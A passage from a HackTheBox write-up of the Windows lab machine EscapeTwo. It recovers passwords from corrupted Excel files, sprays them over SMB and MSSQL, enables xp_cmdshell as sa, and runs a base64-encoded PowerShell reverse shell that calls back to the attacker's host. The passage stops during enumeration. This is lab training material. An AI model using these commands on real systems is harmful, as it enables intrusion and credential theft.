---
title: HTB: EscapeTwo
url: https://0xdf.gitlab.io/2025/05/24/htb-escapetwo.html
date: 2025-05-24T13:45:00+00:00
difficulty: Easy [20]
os: Windows
tags: hackthebox, htb-escapetwo, ctf, assume-breach, nmap, netexec, mssql, smb, windows, active-directory, xlsx, password-spray, xp-cmdshell, netexec-mssql-exec, netexec-bloodhound, certipy, adcs, bloodyad, shadow-credentials, esc4, esc1
---

![EscapeTwo](/img/escapetwo-cover.png)

EscapeTwo starts with an assume breach scenario, a simple windows account with creds. I’ll use those to find a broken Excel workbook, which I’ll recover passwords from to get sa access to MSSQL. From there I’ll enable xp-cmdshell and get a foothold on the box. There I’ll find more creds and pivot to the first user. I’ll abuse a WriteOwner privilege on a service account to get access as that account. The service account can exploit ESC4 in the ADCS setup to get Administrator access.

## Box Info

| Name | [EscapeTwo](https://hackthebox.com/machines/escapetwo)  [EscapeTwo](https://hackthebox.com/machines/escapetwo) [Play on HackTheBox](https://hackthebox.com/machines/escapetwo) |
| --- | --- |
| Release Date | [11 Jan 2025](https://twitter.com/hackthebox_eu/status/1877392419135566002) |
| Retire Date | 24 May 2025 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for EscapeTwo |
| Radar Graph | Radar chart for EscapeTwo |
| First Blood User | 00:20:26[NLTE NLTE](https://app.hackthebox.com/users/260094) |
| First Blood Root | 00:24:57[NLTE NLTE](https://app.hackthebox.com/users/260094) |
| Creators | [ruycr4ft ruycr4ft](https://app.hackthebox.com/users/1253217)  [Llo0zy Llo0zy](https://app.hackthebox.com/users/1615089) |
| Scenario | As is common in real life Windows pentests, you will start this box with credentials for the following account: rose / KxEPkKe6R8su |

## Recon

### nmap

`nmap` finds a bunch of open ports:

```

oxdf@hacky$ nmap -p- --min-rate 10000 -sCV 10.10.11.51
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-13 08:20 EST
Nmap scan report for 10.10.11.51
Host is up (0.14s latency).
Not shown: 65509 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-17 15:45:03Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-17T15:46:40+00:00; +4d02h23m42s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-17T15:46:40+00:00; +4d02h23m42s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-16T12:19:48
|_Not valid after:  2055-01-16T12:19:48
|_ssl-date: 2025-01-17T15:46:40+00:00; +4d02h23m42s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-17T15:46:40+00:00; +4d02h23m42s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-17T15:46:40+00:00; +4d02h23m42s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49718/tcp open  msrpc         Microsoft Windows RPC
49739/tcp open  msrpc         Microsoft Windows RPC
49806/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4d02h23m41s, deviation: 0s, median: 4d02h23m41s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-01-17T15:46:03
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 125.40 seconds

```

The box shows many of the ports associated with a [Windows Domain Controller](/cheatsheets/os#windows-domain-controller). The domain is `sequel.htb`, and the hostname is `DC01`. I’ll add this to my `/etc/hosts` file:

```
10.10.11.51 DC01.sequel.htb sequel.htb DC01 

```

The other interesting port is MSSQL (1433).

### Initial Credentials

I am given credentials for a low priv user (rose, password “KxEPkKe6R8su”) at the start of the box. This is meant to reflect many real world pentests that start this way. I’ll verify they do work over SMB:

```

oxdf@hacky$ netexec smb dc01.sequel.htb 
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
oxdf@hacky$ netexec smb dc01.sequel.htb -u rose -p 'KxEPkKe6R8su'
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 

```

They do not work for WinRM (unsurprisingly):

```

oxdf@hacky$ netexec winrm dc01.sequel.htb -u rose -p 'KxEPkKe6R8su'
WINRM       10.10.11.51     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\rose:KxEPkKe6R8su

```

They do also work for MSSQL:

```

oxdf@hacky$ netexec mssql 10.10.11.51 -u rose -p KxEPkKe6R8su
MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] sequel.htb\rose:KxEPkKe6R8su

```

Given that, I’ll want to prioritize things like:
- MSSQL
- SMB shares
- Bloodhound (which includes most of the data from LDAP)
- ADCS

### MSSQL (as rose)

I’m able to connect to the MSSQL instance as rose:

```

oxdf@hacky$ mssqlclient.py -windows-auth sequel.htb/rose:KxEPkKe6R8su@dc01.sequel.htb
Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (SEQUEL\rose  guest@master)> 

```

The `-windows-auth` flag is necessary to tell it to use the domain for auth.

There are four dbs:

```

SQL (SEQUEL\rose  guest@master)> select name from sys.databases;
name     
------   
master   
tempdb   
model    
msdb

```

These are all [default DBs](https://dataedo.com/kb/databases/sql-server/default-databases-schemas). There’s not much data of interest here.

rose doesn’t have permissions to run commands:

```

SQL (SEQUEL\rose  guest@master)> xp_cmdshell whoami;
ERROR(DC01\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.

```

rose doesn’t have permissions to enable `xp_cmdshell` either:

```

SQL (SEQUEL\rose  guest@master)> enable_xp_cmdshell
ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.
ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.
ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.

```

This makes sense as rose is a guest role:

```

SQL (SEQUEL\rose  guest@master)> SELECT SYSTEM_USER AS CurrentLogin, USER_NAME() AS CurrentUser;
CurrentLogin   CurrentUser   
------------   -----------   
SEQUEL\rose    guest

```

### SMB - TCP 445

#### Shares

I’ll check the shares using `netexec`:

```

oxdf@hacky$ netexec smb dc01.sequel.htb -u rose -p 'KxEPkKe6R8su' --shares
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ            
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.11.51     445    DC01             Users           READ  

```

The `Account Department` and `Users` shares are non-standard and definitely worth checking out. I also have access to `NETLOGON` and `SYSVOL` (standard DC shares), but there’s not anything of interest there.

#### Users

The `Users` share has a `Default` folder:

```

oxdf@hacky$ smbclient //dc01.sequel.htb/users -U rose --password KxEPkKe6R8su
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Jun  9 09:42:11 2024
  ..                                 DR        0  Sun Jun  9 09:42:11 2024
  Default                           DHR        0  Sun Jun  9 07:17:29 2024
  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018

                6367231 blocks of size 4096. 897311 blocks availab

```

It is a Windows user’s home directory:

```

smb: \Default\> ls
  .                                 DHR        0  Sun Jun  9 07:17:29 2024
  ..                                DHR        0  Sun Jun  9 07:17:29 2024
  AppData                            DH        0  Sat Sep 15 03:19:00 2018
  Desktop                            DR        0  Sat Sep 15 03:19:00 2018
  Documents                          DR        0  Sat Jun  8 21:29:57 2024
  Downloads                          DR        0  Sat Sep 15 03:19:00 2018
  Favorites                          DR        0  Sat Sep 15 03:19:00 2018
  Links                              DR        0  Sat Sep 15 03:19:00 2018
  Music                              DR        0  Sat Sep 15 03:19:00 2018
  NTUSER.DAT                          A   262144  Sat Jun  8 21:29:57 2024
  NTUSER.DAT.LOG1                   AHS    57344  Sat Sep 15 02:09:26 2018
  NTUSER.DAT.LOG2                   AHS        0  Sat Sep 15 02:09:26 2018
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf    AHS    65536  Sat Jun  8 21:29:57 2024
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Sat Jun  8 21:29:57 2024
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Sat Jun  8 21:29:57 2024
  Pictures                           DR        0  Sat Sep 15 03:19:00 2018
  Saved Games                         D        0  Sat Sep 15 03:19:00 2018
  Videos                             DR        0  Sat Sep 15 03:19:00 2018

                6367231 blocks of size 4096. 897311 blocks available

```

There’s not anything of interest here.

#### Accounting Department

The `Accounting Department` share has two Excel workbooks:

```

oxdf@hacky$ smbclient //dc01.sequel.htb/Accounting\ Department -U rose --password KxEPkKe6R8su
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jun  9 06:52:21 2024
  ..                                  D        0  Sun Jun  9 06:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 06:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 06:52:07 2024

                6367231 blocks of size 4096. 896988 blocks available

```

I’ll download both:

```

smb: \> prompt off
smb: \> mget *
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (17.6 KiloBytes/sec) (average 17.6 KiloBytes/sec)
getting file \accounts.xlsx of size 6780 as accounts.xlsx (11.7 KiloBytes/sec) (average 14.7 KiloBytes/sec)

```

### Workbooks

#### Identify Corruption

Both workbooks show up as Zip files:

```

oxdf@hacky$ file *.xlsx
accounting_2024.xlsx: Zip archive data, made by v4.5, extract using at least v2.0, last modified, last modified Sun, Jan 01 1980 00:00:00, uncompressed size 1284, method=deflate
accounts.xlsx:        Zip archive data, made by v2.0, extract using at least v2.0, last modified, last modified Sun, Jun 09 2024 10:47:44, uncompressed size 681, method=deflate

```

This is a bit unusual, as while all modern office documents are actually zip files with a specific structure inside, typically an Excel workbook still shows as such:

```

oxdf@hacky$ file example.xlsx 
login-timing.xlsx: Microsoft Excel 2007+

```

Trying to open either of the workbooks in LibreOffice shows it’s corrupted:

![image-20250117121130090](/img/image-20250117121130090.png)

I’ll show two ways to get the information inside the corrupted workbooks.

#### Read via Unzip

As `file` is identifying the files as zip archives, I’ll just `unzip` them:

```

oxdf@hacky$ mkdir accounts
oxdf@hacky$ unzip accounts.xlsx -d accounts
Archive:  accounts.xlsx
file #1:  bad zipfile offset (local header sig):  0
  inflating: accounts/xl/workbook.xml  
  inflating: accounts/xl/theme/theme1.xml  
  inflating: accounts/xl/styles.xml  
  inflating: accounts/xl/worksheets/_rels/sheet1.xml.rels  
  inflating: accounts/xl/worksheets/sheet1.xml  
  inflating: accounts/xl/sharedStrings.xml  
  inflating: accounts/_rels/.rels    
  inflating: accounts/docProps/core.xml  
  inflating: accounts/docProps/app.xml  
  inflating: accounts/docProps/custom.xml  
  inflating: accounts/[Content_Types].xml  

```

This creates 11 files, mostly `.xml` files. `sharedStrings.xml` has usernames, emails, and passwords:

![image-20250522103635485](/img/image-20250522103635485.png)

Some `bash` can clean this up nicely:

```

oxdf@hacky$ cat accounts/xl/sharedStrings.xml | xmllint --xpath '//*[local-name()="t"]/text()' - | awk 'ORS=NR%5?",":"\n"'; echo
First Name,Last Name,Email,Username,Password
Angela,Martin,angela@sequel.htb,angela,0fwz7Q4mSpurIt99
Oscar,Martinez,oscar@sequel.htb,oscar,86LxLBMgEWaKUnBG
Kevin,Malone,kevin@sequel.htb,kevin,Md9Wlq1E5bZnVDVo
NULL,sa@sequel.htb,sa,MSSQLP@ssw0rd!

```

#### Read via Fixing Corruption

The author’s intention was that I fix the corruption. Wikipedia has a [List of File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) page that has an entry that includes `.xlsx`:

![image-20250117121900287](/img/image-20250117121900287.png)

The headers of these files are not that:

```

oxdf@hacky$ xxd accounts.xlsx | head -1
00000000: 5048 0403 1400 0808 0800 f655 c958 0000  PH.........U.X..
oxdf@hacky$ xxd accounting_2024.xlsx | head -1
00000000: 5048 0403 1400 0600 0800 0000 2100 4137  PH..........!.A7

```

It’s a bit weird that both files got modified in the same way.

I’ll open each in a hex editor and update the first four bytes to match the desired XLSX signature:

![image-20250117122137633](/img/image-20250117122137633.png)

Now they both identify as XLSX documents:

```

oxdf@hacky$ file *.xlsx
accounting_2024.xlsx: Microsoft Excel 2007+
accounts.xlsx:        Microsoft Excel 2007+

```

And open in Libre Office. `accounting_2024.xlsx` doesn’t have anything of interest, but `accounts.xlsx` has passwords:

![image-20250117122254071](/img/image-20250117122254071.png)

#### Validate Creds

Over SMB, only the creds for oscar work:

```

oxdf@hacky$ netexec smb dc01.sequel.htb -u users -p passwords --continue-on-success
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [-] sequel.htb\angela:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\kevin:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\oscar:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sa:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\angela:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\kevin:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sa:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\angela:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\kevin:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sa:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\angela:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\kevin:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sa:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\angela: STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\kevin: STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sa: STATUS_LOGON_FAILURE

```

Running `netexec` with `--shares` and oscar’s creds shows the same access as rose.

I can run that same spray on MSSQL. If I use windows auth, I would expect the same results as SMB above. But if I include the `--local-auth` flag, it will check for accounts created in the database itself:

```

oxdf@hacky$ netexec mssql dc01.sequel.htb -u users -p passwords --continue-on-success --local-auth | grep -F [+]
MSSQL                    10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)

```

It finds one! That’s the sa (admin) account.

## Shell as sql\_svc

### MSSQL (as sa)

The oscar creds work to connect to MSSQL, but that account is a guest role as well. The local sa creds work as well:

```

oxdf@hacky$ mssqlclient.py 'sequel.htb/sa:MSSQLP@ssw0rd!@dc01.sequel.htb'
Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)>

```

`xp_cmdshell` is still disabled:

```

SQL (sa  dbo@master)> xp_cmdshell whoami
ERROR(DC01\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.

```

But this time as sa, I can enable it:

```

SQL (sa  dbo@master)> enable_xp_cmdshell
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> xp_cmdshell whoami
output           
--------------   
sequel\sql_svc   

NULL

```

Alternatively, I can use `netexec`, which will enable it and run commands for me:

```

oxdf@hacky$ netexec mssql dc01.sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -x whoami
MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
MSSQL       10.10.11.51     1433   DC01             [+] Executed command via mssqlexec
MSSQL       10.10.11.51     1433   DC01             sequel\sql_svc

```

### Shell

I’ll grab a PowerShell #3 (Base64) reverse shell from [revshells.com](https://www.revshells.com/), and run it with `xp_cmdshell`:

```

SQL (sa  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

```

It hangs, but at my listening `nc`, there’s a shell:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.51 54229

PS C:\Windows\system32> whoami
sequel\sql_svc

```

It works over `netexec` as well:

```

oxdf@hacky$ netexec mssql dc01.sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -x 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
[22:22:59] ERROR    Error when attempting to execute command via xp_cmdshell: timed out                                  mssqlexec.py:30
[22:23:04] ERROR    [OPSEC] Error when attempting to restore option 'xp_cmdshell': timed out                             mssqlexec.py:47

```

The command times out, but I have a stable shell.

## Shell as ryan

### Enumeration

#### Users

The sql\_svc user doesn’t have any interesting privileges:

```

PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

```

There’s nothing in their home directory:

```

PS C:\users\sql_svc> tree /f /a
Folder PATH listing
Volume serial number is 3705-289D
C:.
+---Desktop
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
\---Videos

```

There are three other users. sql\_svc can’t access Administrator or ryan, and Public only has the same two documents from the share:

```

PS C:\users> tree /f /a
Folder PATH listing
Volume serial number is 3705-289D
C:.
+---Administrator
+---Public
|   +---Accounting Department
|   |       accounting_2024.xlsx
|   |       accounts.xlsx
|   |       
|   +---Documents
|   +---Downloads
|   +---Music
|   +---Pictures
|   \---Videos
+---ryan
\---sql_svc
    +---Desktop
    +---Documents
    +---Downloads
    +---Favorites
    +---Links
    +---Music
    +---Pictures
    +---Saved Games
    \---Videos

```

#### Filesystem Root

In the root of `c:` there’s one unusual folder, `SQL2019`:

```

PS C:\> ls

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/5/2022  12:03 PM                PerfLogs
d-r---         1/4/2025   7:11 AM                Program Files
d-----         6/9/2024   8:37 AM                Program Files (x86)
d-----         6/8/2024   3:07 PM                SQL2019
d-r---         6/9/2024   6:42 AM                Users
d-----         1/4/2025   8:10 AM                Windows

```

It has a single folder with stuff inside of that:

```

PS C:\SQL2019\ExpressAdv_ENU> ls

